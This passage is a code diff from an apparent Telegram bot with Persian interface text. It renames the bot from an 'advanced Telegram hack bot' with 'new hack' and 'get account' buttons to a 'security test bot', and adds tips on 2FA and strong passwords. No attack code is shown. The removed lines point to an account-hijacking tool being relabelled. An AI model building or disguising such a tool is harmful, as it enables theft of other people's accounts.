+✅ توصیه می‌شود:
+• از کدهای تصادفی استفاده کنید
+• 2FA را فعال کنید
+• از پسورد قوی استفاده کنید
 """
         
         keyboard = [
-            [InlineKeyboardButton("🔑 هک جدید", callback_data="new_session")],
-            [InlineKeyboardButton("📱 گرفتن اکانت", callback_data="get_account")],
+            [InlineKeyboardButton("🔑 تست مجدد", callback_data="new_session")],
             [InlineKeyboardButton("🏠 بازگشت", callback_data="back")]
         ]
         
@@ -1144,7 +1227,7 @@ def main():
         delete_webhook()
         
         print("=" * 60)
-        print("🔥 ربات هک پیشرفته تلگرام")
+        print("🔐 ربات تست امنیت تلگرام")
         print("=" * 60)
         print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
         print(f"🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}")
